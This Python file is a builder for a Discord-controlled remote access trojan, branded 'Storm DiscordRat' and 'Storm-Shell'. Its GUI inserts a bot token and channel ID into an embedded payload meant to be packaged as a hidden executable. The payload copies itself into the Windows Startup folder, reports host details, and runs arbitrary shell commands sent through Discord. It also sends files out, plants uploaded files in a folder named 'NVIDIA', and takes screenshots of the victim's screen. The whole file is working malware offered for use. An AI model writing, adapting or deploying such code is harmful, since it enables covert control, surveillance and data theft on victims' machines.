from customtkinter import *
from PIL import Image
import os
from tkinter import messagebox 
#alot of errors when using pyinstaller #thanks for the dumbass who told me about the token by spamming using it, thats a nice idea ill add that to my next discord message spammer 0.4!
code=r"""
import discord
from discord.ext import commands
import os
import platform
import subprocess
import sys
import asyncio
import threading
import shutil
import pyautogui
import requests
global current_directory
current_directory = os.getcwd()

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

def main():
    def c():
        payload={"content":"working!"};r=requests.post(url="BOT_TOKEN",json=payload)
        if r.ok: Bot.run(BOT_TOKEN)
        else: r ;SystemExit()
    BOT_TOKEN = THE-TOKEN
    Bot = commands.Bot(command_prefix="!", intents=intents)

    user_name = os.getlogin()
    system = platform.system()
    rel = platform.release()
    ver = platform.version()
    sleep_ = 1200

    allowed_channel_id = CHANNEL_ID 

    @Bot.event
    async def on_ready():
        def add_to_startup(file_path):
            startup_folder = os.path.join(
                os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup"
                )
            if not os.path.exists(startup_folder):
                pass
            
            if not file_path.endswith(".exe"):
                pass
            try:
                shutil.copy(file_path, startup_folder)
                pass
            except Exception as e:
                pass

        script_path = os.path.abspath(sys.argv[0]) 

        try:
            add_to_startup(script_path) 
            pass
        except Exception as e:
            pass
        channel = Bot.get_channel(CHANNEL_ID)

        embed = discord.Embed(
            title="**Session is Open!** 🐀",
            description="The Session is now online and ready to interact. use !h for help.",
            color=discord.Color.brand_green()
        )
        user_name = os.getlogin()
        system = platform.system()
        rel = platform.release()
        ver = platform.version()

        embed.add_field(
            name=f" 📑 Host details\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n 💻 ``Host Name:`` {user_name}\n 📀 ``Operating System:`` {system}\n 🪴 ``Release:`` {rel}\n ⚗️ ``Version:`` {ver}",
            value=f"",
            inline=False
        )

        embed.set_footer(
            text="StormTools Storm-Shell 1.1 ⛈️ ",
            icon_url="https://imgur.com/xKuYtVC.gif" 
        )

        await channel.send(embed=embed)
        await Bot.change_presence(
            status=discord.Status.do_not_disturb,
            activity=discord.Activity(type=discord.ActivityType.listening, name=user_name)
        )

#power mange
    def restart_():
        python = sys.executable
        os.execl(python, python, *sys.argv)

    async def auto_restart(): #wont work on exe
        while True:
            await asyncio.sleep(sleep_) 
            restart_()

    async def setup_hook():
        Bot.loop.create_task(auto_restart())
    Bot.setup_hook = setup_hook

    @Bot.command()
    async def reset_session(ctx):
        embed = discord.Embed(
            title="🔋 Restarting session...",
            description="The session is rebooting. Please wait...",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        restart_()
#shell
    @Bot.command()
    async def shell(ctx, *message):
        global current_directory
        if message:
            try:
                command = ' '.join(message)
                if command.startswith("cd"):
                    path = command[3:].strip()
                    new_directory = current_directory

                    if path == "..":
                        new_directory = os.path.dirname(current_directory)
                    elif os.path.isabs(path):
                        new_directory = path
                    else:
                        new_directory = os.path.join(current_directory, path)

                    if os.path.isdir(new_directory):
                        current_directory = os.path.abspath(new_directory)
                        embed = discord.Embed(
                            title="📂 Directory Changed!",
                            description=f"Current directory: `{current_directory}`",
                            color=discord.Color.green()
                        )
                        await ctx.send(embed=embed)
                    else:
                        embed = discord.Embed(
                            title="❌ Directory Not Found",
                            description=f"Directory `{path}` not found.",
                            color=discord.Color.red()
                        )
                        await ctx.send(embed=embed)
                    return

                # Run the command without modifying it unless required
                result = subprocess.run(
                    command, shell=True, cwd=current_directory, capture_output=True, text=True, errors="replace"
                )

                output = result.stdout or ""
                error_output = result.stderr or ""

                async def send_in_chunks(data):
                    for i in range(0, len(data), 1000):
                        embed = discord.Embed(
                            title=" 📑 Command Output",
                            description=f"```bash\n{data[i:i+1000]}\n```",
                            color=discord.Color.blue()
                        )
                        await ctx.send(embed=embed)

                if output.strip():
                    await send_in_chunks(output.strip())
                elif error_output.strip():
                    await send_in_chunks(error_output.strip())
                else:
                    embed = discord.Embed(
                        title="ℹ️ Command Executed",
                        description="The command executed, but there was no output.",
                        color=discord.Color.greyple()
                    )
                    await ctx.send(embed=embed)

            except Exception as e:
                embed = discord.Embed(
                    title="❌ An Error Occurred",
                    description=f"Error: `{e}`",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
#install
    @Bot.command()
    async def install(ctx, *, filename: str):
        try:
            file_path = os.path.join(current_directory, filename)

            if os.path.exists(file_path):
                embed = discord.Embed(
                    title="🥞 File Installed!",
                    description=f"Here is your file `{filename}`.",
                    color=discord.Color.green()
                )
                await ctx.send(embed=embed, file=discord.File(file_path))
            else:
                embed = discord.Embed(
                    title="❌ File Not Found",
                    description=f"Sorry, the file `{filename}` was not found.",
                    color=discord.Color.red()
                )
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❎ Error",
                description=f"An error occurred: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
#upload
    @Bot.event
    async def on_message(message):
        if message.author == Bot.user:
            return
        if message.channel.id == allowed_channel_id and message.attachments:
            for attachment in message.attachments:
                try:
                    file_path = f'./NVIDIA/{attachment.filename}'
                    if not os.path.exists('./NVIDIA'):
                        os.makedirs('./NVIDIA')
                    await attachment.save(file_path)
                    embed = discord.Embed(
                        title="📁 File Saved",
                        description=f"File saved successfully as: `{file_path}` ✅",
                        color=discord.Color.green()
                    )
                    await message.channel.send(embed=embed)
                except Exception as e:
                    embed = discord.Embed(
                        title="❌ Error Saving File",
                        description=f"An error occurred while saving the file: {e}",
                        color=discord.Color.red()
                    )
                    await message.channel.send(embed=embed)

        await Bot.process_commands(message)

#Tools
    @Bot.command()
    async def screenshot(ctx):
        image = pyautogui.screenshot()
        image.save('image.png')
        await ctx.send(file=discord.File('image.png'))
        os.remove('image.png')

    @Bot.command() #disable
    async def grab_ip(ctx):
        embed = discord.Embed(
            title="💻 Gathering System Info...",
            description="Fetching system information, please wait...",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)  

    @Bot.command()
    async def h(ctx):
        embed = discord.Embed(
            title="**Bot Commands Help** 🔧",
            description="Here are the commands you can use with the bot:",
            color=discord.Color.purple()
        )
        embed.add_field(
            name="**`!shell <command>`** 🖥️",
            value="Run shell on the attacked mech.",
            inline=False
        )
        embed.add_field(
            name="**`download and upload`** 📥",
            value=" to install a file use: !install <file_name> \n to upload a file just send the file to the channel\nremeber files u send will saved in a folder named: NVIDIA",
            inline=False
        )

        embed.add_field(
            name="**`!reset_session (for python scripts only)`** 🔄",
            value="Restart the bot session.",
            inline=False
        )
        embed.add_field(
            name="**`record and screen`** 📸",
            value="!screenshot",
            inline=False
        )

        embed.set_footer(
            text="Powered by Storm-Shell 1.1 ⛈️",
            icon_url="https://i.imgur.com/3wJmFJ0.png" 
        )

        await ctx.send(embed=embed)
    c()

if __name__ == "__main__":
    main()

"""
def exectue(filename,icon_path,token,channel_id):

    with open("script.py","w",encoding='utf-8') as file:
        file.write(code)
    with open("script.py","r",encoding='utf-8') as file:
        content=file.read()
    content = content.replace("THE-TOKEN", f"\'{token}\'")
    content = content.replace("CHANNEL_ID", f'\"{channel_id}\"')

    with open("script.py", "w", encoding='utf-8') as file:
        file.write(content)

    #os.system(f"pyinstaller --onefile --noconsole --hidden-import=discord --hidden-import=discord.ext.commands --hidden-import=os --hidden-import=platform --hidden-import=subprocess --hidden-import=sys --hidden-import=asyncio --hidden-import=threading --hidden-import=shutil --hidden-import=pyautogui --hidden-import=requests  --icon={icon_path} --name {filename} script.py")
    messagebox.showinfo("done","file executed")
def check():
    discord_token1 = Discord_bot_token.get()
    file_name1=FILE_NAME.get()
    icon1=ICON.get()
    channel1=Channel_id.get()

    if discord_token1 and file_name1 and icon1 and channel1:
        print("all the info is ready --> execute");exectue(file_name1,icon1,discord_token1,channel1)
    elif discord_token1 =="":
        messagebox.showerror("Error","forget the token?")
    elif file_name1 == "":
        messagebox.showerror("Error","forget the file name?")
    elif icon1 == "":
        messagebox.showerror("Error","forget the icon?")
    elif channel1 == "":
        messagebox.showerror("Error","forget the channel id?")
def main():
    global Discord_bot_token,FILE_NAME,ICON,Channel_id
    root=CTk()
    root.title("Storm DiscordRat 0.1")
    root.geometry("500x500+700+220")
    root.resizable(0,0)
    #root.iconbitmap()
    image=CTkImage(light_image=Image.open("main.png"),dark_image=Image.open("main.png"),size=(500,500))
    Main=CTkLabel(root,image=image,width=500,height=500,text="")

    Discord_bot_token=CTkEntry(Main,placeholder_text="",
                               width=350,height=50,corner_radius=5,border_width=5,border_color="#E3E7EB",
                               placeholder_text_color="#E3E7EB",bg_color="#34373B",fg_color="#78AFCA",font=(("Daffiys",25)))

    FILE_NAME=CTkEntry(Main,placeholder_text="",
                               width=350,height=50,corner_radius=5,border_width=5,border_color="#E3E7EB",
                               placeholder_text_color="#E3E7EB",bg_color="#34373B",fg_color="#78AFCA",font=(("Daffiys",25)))
    
    ICON=CTkEntry(Main,placeholder_text="",
                               width=200,height=40,corner_radius=5,border_width=5,border_color="#E3E7EB",
                               placeholder_text_color="#E3E7EB",bg_color="#34373B",fg_color="#78AFCA",font=(("Daffiys",25)))
    Channel_id=CTkEntry(Main,placeholder_text="",
                               width=150,height=35,corner_radius=5,border_width=5,border_color="#E3E7EB",
                               placeholder_text_color="#E3E7EB",bg_color="#34373B",fg_color="#78AFCA",font=(("Daffiys",25)))
    EXECUTE=CTkButton(Main,text="Execute",command=check,
                               width=50,height=40,corner_radius=5,border_width=5,border_color="#E3E7EB",
                              text_color="#E3E7EB",bg_color="#34373B",fg_color="#78AFCA",font=(("Daffiys",25)))
    
    Main.pack()
    Discord_bot_token.place(x=75,y=175)
    FILE_NAME.place(x=75,y=305)
    ICON.place(x=180,y=372)
    Channel_id.place(x=180,y=420)
    EXECUTE.place(x=380,y=441)

    root.mainloop()
if __name__=="__main__":
    main()
